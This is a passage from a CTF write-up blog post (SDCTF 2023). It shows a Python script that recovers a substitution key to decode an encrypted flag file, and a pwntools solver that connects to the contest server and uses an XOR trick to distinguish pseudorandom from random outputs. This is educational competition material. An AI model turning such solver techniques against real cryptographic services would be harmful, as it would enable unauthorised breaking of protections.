match.span()</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin)):</span><br><span class="line">        key[encoded[i]] = origin[i]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        e = f.read()</span><br><span class="line">        encoded = <span class="string">&quot;&#x27;: 123456789.0, &#x27;items&#x27;:[]&#125;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encoded):</span><br><span class="line">            key[e[i+span[<span class="number">1</span>]]] = encoded[i]</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    key[<span class="string">&#x27;y&#x27;</span>] = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;]&#x27;</span>] = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;J&#x27;</span>] = <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;^&#x27;</span>] = <span class="string">&#x27;(&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;g&#x27;</span>] = <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;.&#x27;</span>] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;=&#x27;</span>] = <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">len</span>(key), <span class="built_in">len</span>(string.printable))</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    origin = <span class="string">&quot;&#123;&#x27;the_quick_brown_fox_jumps_over_the_lazy_dog&#x27;:&quot;</span></span><br><span class="line">    check_doc = <span class="string">&quot;&quot;&quot;F+</span></span><br><span class="line"><span class="string">_f5&#125;I_7|0_17s+_B&amp;N)K_n+(_,O+1q_CQ*)`_7|0&quot;&quot;&quot;</span></span><br><span class="line">    check_doc = <span class="built_in">list</span>(<span class="built_in">reversed</span>(check_doc))</span><br><span class="line">    origin_upper = origin.upper()[<span class="number">2</span>:<span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin_upper)):</span><br><span class="line">        <span class="keyword">if</span> check_doc[i] <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            key[check_doc[i]] = origin_upper[i]</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;check doc len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(check_doc)))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        e = f.read()</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> e:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> key:</span><br><span class="line">                data += key[c]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data += c</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>And finally we can have the flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo c2RjdGZ7VV91blJhdjNsZWRfdEgzX3NuM2shfQ== | base64 -d</span><br><span class="line">sdctf&#123;U_unRav3led_tH3_sn3k!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Lake-of-Pseudo-Random-Fire">Lake of Pseudo Random Fire</h3>
<p>Notice that <code>pseudorandom(self, msg)</code> will decrypt the <code>msg</code> after XOR with <code>0xff</code>. So by XORing the first part of the returned strings of <code>pseudorandom(self, msg)</code> we can recover the <code>msg</code> sent by us if it is a pseudorandom door.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./game.py&quot;</span>])</span><br><span class="line">sh = remote(<span class="string">&quot;prf.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;round: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    data = <span class="string">b&#x27;00000000000000000000000000000000&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;utter: &#x27;</span>, data)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door1 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door2 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    binascii.hexlify(<span class="built_in">bytes</span>(x ^ <span class="number">0xff</span> <span class="keyword">for</span> x <span class="keyword">in</span> binascii.unhexlify(door1[:<span class="number">32</span>])))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;utter: &#x27;</span>, binascii.hexlify(<span class="built_in">bytes</span>(x ^ <span class="number">0xff</span> <span class="keyword">for</span> x <span class="keyword">in</span> binascii.unhexlify(door1[:<span class="number">32</span>]))))</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door1 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door2 = sh.recv(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">in</span> door1:</span><br><span class="line">        sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">SDCTF 2023 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Turtle-Shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">Turtle Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tROPic-thunder"><span class="toc-number">1.1.2.</span> <span class="toc-text">tROPic-thunder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#money-printer"><span class="toc-number">1.1.3.</span> <span class="toc-text">money-printer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#money-printer2"><span class="toc-number">1.1.4.</span> <span class="toc-text">money-printer2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rtld-global"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">rtld_global</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">Canary</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Runner"><span class="toc-number">1.2.1.</span> <span class="toc-text">Secure Runner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fork-bomb-protector"><span class="toc-number">1.2.2.</span> <span class="toc-text">Fork bomb protector</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jumbled-snake"><span class="toc-number">1.3.1.</span> <span class="toc-text">Jumbled snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lake-of-Pseudo-Random-Fire"><span class="toc-number">1.3.2.</span> <span class="toc-text">Lake of Pseudo Random Fire</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&text=SDCTF 2023 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&is_video=false&description=SDCTF 2023 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SDCTF 2023 Writeup&body=Check out this article: https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&name=SDCTF 2023 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&t=SDCTF 2023 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
